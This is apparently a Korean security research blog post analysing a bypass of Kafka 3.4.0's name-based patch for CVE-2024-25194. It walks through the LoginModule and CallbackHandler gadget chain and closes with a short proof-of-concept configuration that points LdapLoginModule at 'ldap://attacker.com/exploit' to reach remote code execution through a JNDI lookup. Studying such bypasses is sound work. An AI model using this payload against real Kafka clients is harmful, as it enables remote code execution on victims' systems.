---
title : "Kafka 1-day Analysis Part1"
date : 2026-04-19 10:00:00 +0900
categories: [Research]
tags: [Java, Kafka, 1day]
media_subpath: /assets/img/posts/kafka-analysis
---

글이 너무 길어져서 파트를 쪼개서 설명하도록 한다.

이전 내용 : Part1 참고

# Patch code of cve-2024-25194

kafka 3.4.0에서는 아래와 같이 코드를 패치했다.

```java
// 1번: 차단할 LoginModule 기본값 설정
// JndiLoginModule을 기본으로 차단
public static final String DISALLOWED_LOGIN_MODULES_DEFAULT = 
    "com.sun.security.auth.module.JndiLoginModule";

// 3~13번: LoginModule 차단 로직
private static void throwIfLoginModuleIsNotAllowed(...) {
    
    // 4~7번: 차단 목록 가져오기
    // 시스템 설정에서 차단 목록 읽어옴
    // 기본값 = JndiLoginModule
    Set<String> disallowedList = Arrays.stream(
        System.getProperty(DISALLOWED_LOGIN_MODULES_CONFIG, 
                          DISALLOWED_LOGIN_MODULES_DEFAULT)
        .split(","))
        .map(String::trim)
        .collect(Collectors.toSet());

    // 8번: 사용하려는 LoginModule 이름 가져옴
    String loginModuleName = 
        appConfigurationEntry.getLoginModuleName().trim();

    // 9~11번: ← 핵심 패치 로직
    // 차단 목록에 있으면 Exception 발생시켜서 실행 막음
    if (disallowedList.contains(loginModuleName)) {
        throw new IllegalArgumentException(
            loginModuleName + " is not allowed.");
    }
}
```

위의 패치 코드의 문제점은 단순 이름 비교로 막고 있다는 것이다.

→ JndiLoginModule만 막힘

→ 다른 LoginModule은 우회 가능

# Bypass patch of CVE-2024-25194

해당 패치를 우회하기 위한 핵심 아이디어는 아래와 같다.

```java
// 패치 코드
if (disallowedList.contains(loginModuleName)) {
    throw new Exception("차단!")
}

// 차단 목록
DISALLOWED_LOGIN_MODULES_DEFAULT = 
    "com.sun.security.auth.module.JndiLoginModule"
```

패치 코드를 분석해보니 위와 같이 JndiLoginModule 이름만 비교해서 막고 있다 → 다른 LoginModule을 쓰면 우회가 가능하지 않을까?

<LoginModule의 조건>

아무 LoginModule이나 쓸 수 있는게 아니고 조건이 있다.

<aside>
💡

- javax.sercurity.auth.spi.LoginModule 구현체
- 인기있는 Java 라이브러리에 존재
- RCE, Arbitary File Write, Arbitary File Read, etc
</aside>

<위의 조건이 생긴 이유>

조건 1. LoginModule 인터페이스 구현체여야함

```
Kafka가 LoginModule을 실행하는 방식은 아래와 같다.

LoginContext.login() -> 설정에 적힌 클래스를 LoginModule로 캐스팅 -> login() 매서드 호출

즉 LoginModule 인터페이스를 구현한 클래스만 Kafka가 실행할 수 있다.

아무 클래스나 넣으면 -> ClassCastException이 발생 -> 공격 실패
```

조건 2. 인기있는 Java 라이브러리에 존재해야 함

```
공격이 성립하려면 Kafka client에 존재하는 라이브러리 클래스를 사용해야 한다.

만약 Kafka Client에 없는 클래스라면 위의 캐스팅과 비슷한 문제가 발생할 수 있다 -> 공격 실패
```

조건3. RCE 등 트리거 가능해야함

```
LoginModule을 실행할 수 있어도 그 안에서 위험한 동작이 없으면 의미가 없다.

-> JNDI lookup
-> Arbitary File read/write
-> RCE
이런 동작이 내부에 있어야 공격이 가능함
```

## ProxyLoginModule

```
ProxyLoginModule은 JBoss(Red Hat) 라이브러리에 있는 클래스
-> 다른 LoginModule을 대신 실행해주는 역할 -> 이걸 악용해서 패치 우회
```

아래의 코드가 ProxyLoginModule 클래스의 내부 코드이다.

```java
// 5번: options에서 "moduleName" 읽어옴
// 이게 핵심! 외부에서 주입 가능한 값
this.moduleName = (String)options.get("moduleName");

if (this.moduleName != null) {
    
    // 9번: moduleName에 해당하는 클래스를 동적으로 로드
    Class<?> clazz = loader.loadClass(this.moduleName);
    
    // 10번: 그 클래스의 인스턴스 생성
    this.delegate = (LoginModule)clazz.newInstance();
    
    // 15번: 로드한 클래스 초기화
    this.delegate.initialize(...options);
}
```

options에서 moduleName을 읽어서 그 클래스를 동적으로 로드하고 있다. 여기서 moduleName에 악성 클래스 이름을 넣으면 → ProxyLoginModule이 대신 로드해줌 → 패치 우회 가능

## LdapLoginModule

LdapLoginModule은 LDAP 서버로 사용자 인증을 해주는 모듈이다. 

```java
<동작 원리>
1. CallbackHandler에서 username, password 가져옴
2. password가 비어있지 않으면
3. JNDI lookup 실행 <- 여기서 RCE 트리거
```

하지만 여기서 문제는 LdapLoginModule을 쓰기 위해서는 적절한 CallbackHandler가 필요하다. 

```java
CallbackHandler의 조건은 아래와 같다.
- AuthenticateCallbackHandler 구현
- NameCallback 처리 가능
- PasswordCallback 처리 가능
- 비어있지 않은 password 반환
```

위의 조건을 만족하는 CallbackHandler를 Confluent에서 찾게 되었다.

```java
Confluent는 Kafka 상업용 버전이다. 여기서 해당 구현체를 탐색해보니 아래 두개의 후보로 추려졌다.

1. cp-kafka
2. cp-server <- 여기서 적절한 CallbackHandler를 발견함

FileBasedDynamicPlainLoginCallbackHandler <- 이걸 사용
```

### FileBasedDynamicPlainLoginCallbackHandler

해당 핸들러는 로컬 파일에서 username:password를 읽어오는 핸들러이다. 조금 더 자세하게 설명하자면

<aside>
💡

LdapLoginModule이 인증을 할 때 username이랑 password가 필요하다. 

근데 LdapLoginModule이 직접 가져오는 게 아니라 CallbackHandler에 질의를 하게 된다.

CallbackHandler 질의 → ex) username, pw 가져와 줘 → CallbackHandler가 가져와줌

</aside>

하지만 FileBasedDynamicPlainLoginCallbackHandler는

<aside>
💡

파일에서 username:password를 읽어오는 CallbackHandler이다.

파일 형식은 user1:password1, user2:password2 → 이런 식으로 구성돼있음

</aside>

그래서 이걸 어떻게 실제 익스플로잇에 활용하는가?

<aside>
💡

LdapLoginModule 공격의 조건은 아래와 같음

LdapLoginModule이 JNDI lookup을 하려면 → pw가 비어있지 않아야 한다.

근데 기본적으로 CallbackHandler들은 → pw를 제대로 반환하지 못하거나 → Exception이 발생함

FileBasedDynamicPlainLoginCallbackHandler는 → 파일에서 pw 읽어서 반환 → pw 비어있지 않음 → LdapLoginModule이 JNDI lookup → RCE

</aside>

### PoC

최종 공격 페이로드는 아래와 같다.

```java
sasl.jaas.config =
    com.sun.security.auth.module.LdapLoginModule required
    userProvider="ldap://attacker.com/exploit";

sasl.callback.handler.class =
    FileBasedDynamicPlainLoginCallbackHandler
```

공격 흐름을 정리하자면

1. LdapLoginModule은 필터링 하지 않기 때문에 → 패치를 통과함
2. FileBasedDynamicPlainLoginCallbackHandler가 파일에서 username, password 읽어옴 → pw 비어있지 않음
3. LdapLoginModule이 JNDI lookup 실행 → 공격자 LDAP 서버에 접속 → RCE 달성

![image.png](image.png)

따라서 PoC는 위와 같이 구성할 수 있다.

![image.png](image1.png)
